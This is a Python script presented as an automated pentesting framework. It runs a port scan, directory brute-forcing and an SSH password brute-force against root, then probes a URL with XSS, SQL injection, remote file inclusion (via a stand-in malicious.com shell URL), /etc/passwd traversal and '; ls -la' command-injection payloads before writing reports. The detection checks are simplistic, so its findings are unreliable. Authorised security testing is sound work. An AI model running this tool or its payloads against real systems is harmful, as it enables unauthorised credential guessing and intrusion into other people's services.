import socket
import requests
import threading
import os
import json
import csv
import logging
from queue import Queue
from datetime import datetime

# Task Queue for Multithreading
task_queue = Queue()
results = {}

# Create results and logs directories if they don't exist
if not os.path.exists('results'):
    os.makedirs('results')

if not os.path.exists('logs'):
    os.makedirs('logs')

# Set up logging
logging.basicConfig(
    filename=f'logs/pentest_log_{datetime.now().strftime("%Y-%m-%d")}.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Task Definitions with Enhanced Functionality and Error Handling

# Port Scanner with logging and error handling
def port_scanner(ip, port_range):
    logging.info(f"Starting port scan on {ip}...")
    open_ports = []
    closed_ports = []
    filtered_ports = []
    
    for port in range(port_range[0], port_range[1]):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
            if not s.connect_ex((ip, port)):
                open_ports.append(port)
                logging.info(f"Port {port} on {ip} is OPEN.")
            else:
                closed_ports.append(port)
        except Exception as e:
            filtered_ports.append(port)
            logging.error(f"Error scanning port {port} on {ip}: {e}")
        s.close()
    
    results['Port Scan'] = {
        "Open Ports": open_ports,
        "Closed Ports": closed_ports,
        "Filtered Ports": filtered_ports
    }
    logging.info(f"Completed port scan on {ip}.")

# Directory Brute Forcing
def dir_bruteforce(url, wordlist):
    logging.info(f"Starting directory brute-force on {url}...")
    found_dirs = []
    
    for word in wordlist:
        directory = word.strip()
        full_url = f"{url}/{directory}"
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                found_dirs.append(f"{full_url} (Status: 200 OK)")
                logging.info(f"Found directory: {full_url} (200 OK)")
            elif response.status_code == 403:
                logging.warning(f"Directory {full_url} (403 Forbidden)")
            elif response.status_code == 301 or response.status_code == 302:
                logging.info(f"Directory {full_url} redirects to {response.headers['Location']}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error during directory brute-force: {e}")
    
    results['Directory Bruteforce'] = found_dirs
    logging.info(f"Completed directory brute-force on {url}.")

# SSH Brute Force
def ssh_brute_force(hostname, username, password_list):
    import paramiko
    logging.info(f"Starting SSH brute-force on {hostname}...")
    success = None
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in password_list:
        try:
            client.connect(hostname, username=username, password=password, timeout=2)
            success = f"Successful Login with password: {password}"
            logging.info(success)
            break
        except paramiko.AuthenticationException:
            logging.warning(f"Failed login attempt on {hostname} with password: {password}")
        except Exception as e:
            logging.error(f"Error connecting to SSH on {hostname}: {e}")
    
    client.close()
    
    if success:
        results['SSH Brute Force'] = success
    else:
        results['SSH Brute Force'] = "All attempts failed."
    logging.info(f"Completed SSH brute-force on {hostname}.")

# Vulnerability Scanner with more checks (RFI, LFI, Command Injection, Open Redirect)
def vulnerability_scanner(url):
    logging.info(f"Starting vulnerability scanning on {url}...")
    vulnerabilities = {}
    
    xss_payload = "<script>alert(1)</script>"
    sql_payload = "' OR '1'='1"
    rfi_payload = "http://malicious.com/shell.txt"
    lfi_payload = "../../../../etc/passwd"
    command_injection_payload = "; ls -la"
    
    try:
        # XSS Check
        xss_response = requests.get(url + "?q=" + xss_payload)
        if xss_payload in xss_response.text:
            vulnerabilities['XSS'] = "Vulnerable"
            logging.info("XSS Vulnerability found.")
        else:
            vulnerabilities['XSS'] = "Not Vulnerable"
        
        # SQL Injection Check
        sql_response = requests.get(url + "?q=" + sql_payload)
        if "mysql" in sql_response.text.lower():
            vulnerabilities['SQL Injection'] = "Vulnerable"
            logging.info("SQL Injection vulnerability found.")
        else:
            vulnerabilities['SQL Injection'] = "Not Vulnerable"
        
        # RFI Check
        rfi_response = requests.get(url + "?q=" + rfi_payload)
        if "shell" in rfi_response.text:
            vulnerabilities['RFI'] = "Vulnerable"
            logging.info("Remote File Inclusion (RFI) vulnerability found.")
        else:
            vulnerabilities['RFI'] = "Not Vulnerable"
        
        # LFI Check
        lfi_response = requests.get(url + "?q=" + lfi_payload)
        if "root" in lfi_response.text:
            vulnerabilities['LFI'] = "Vulnerable"
            logging.info("Local File Inclusion (LFI) vulnerability found.")
        else:
            vulnerabilities['LFI'] = "Not Vulnerable"
        
        # Command Injection Check
        ci_response = requests.get(url + "?q=" + command_injection_payload)
        if "total" in ci_response.text:
            vulnerabilities['Command Injection'] = "Vulnerable"
            logging.info("Command Injection vulnerability found.")
        else:
            vulnerabilities['Command Injection'] = "Not Vulnerable"
        
    except requests.exceptions.RequestException as e:
        vulnerabilities['Error'] = str(e)
        logging.error(f"Error during vulnerability scanning: {e}")
    
    results['Vulnerability Scanner'] = vulnerabilities
    logging.info(f"Completed vulnerability scanning on {url}.")

# Thread worker to execute tasks
def task_worker():
    while not task_queue.empty():
        task, args = task_queue.get()
        task(*args)
        task_queue.task_done()

# Function to Generate HTML Report
def generate_html_report():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_file = f"results/report_{timestamp}.html"

    with open(report_file, "w") as file:
        file.write("<html><head><title>Pentesting Report</title></head><body>")
        file.write(f"<h1>Pentesting Report - {timestamp}</h1>")
        
        for test, result in results.items():
            file.write(f"<h2>{test}</h2>")
            file.write("<ul>")
            if isinstance(result, dict):
                for key, value in result.items():
                    file.write(f"<li><strong>{key}:</strong> {value}</li>")
            elif isinstance(result, list):
                for item in result:
                    file.write(f"<li>{item}</li>")
            else:
                file.write(f"<li>{result}</li>")
            file.write("</ul>")
        
        file.write("</body></html>")
    logging.info(f"HTML Report saved to {report_file}")

# Function to Generate JSON Report
def generate_json_report():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_file = f"results/report_{timestamp}.json"

    with open(report_file, "w") as file:
        json.dump(results, file, indent=4)
    logging.info(f"JSON Report saved to {report_file}")

# Function to Generate CSV Report
def generate_csv_report():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_file = f"results/report_{timestamp}.csv"

    with open(report_file, "w", newline='') as file:
        writer = csv.writer(file)
        writer.writerow(["Test", "Result"])
        for test, result in results.items():
            writer.writerow([test, result])
    logging.info(f"CSV Report saved to {report_file}")

# Main Framework Function
def run_framework(target_ip, target_url):
    logging.info("Starting automated pentesting...")

    # Add tasks to the queue
    task_queue.put((port_scanner, (target_ip, (1, 1025))))  # Scan ports 1-1024
    task_queue.put((dir_bruteforce, (target_url, ['admin', 'login', 'test', 'backup'])))  # Bruteforce example
    task_queue.put((ssh_brute_force, (target_ip, "root", ["admin", "password123", "toor"])))  # SSH Brute Force
    task_queue.put((vulnerability_scanner, (target_url,)))  # Vulnerability scanning

    # Create a thread pool and assign tasks
    for _ in range(4):
        t = threading.Thread(target=task_worker)
        t.start()
    
    task_queue.join()  # Wait for all tasks to complete

    # Generate Reports
    generate_html_report()
    generate_json_report()
    generate_csv_report()
    logging.info("Automated pentesting completed.")

# Run the pentesting framework
target_ip = "192.168.1.100"
target_url = "http://example.com"

run_framework(target_ip, target_url)
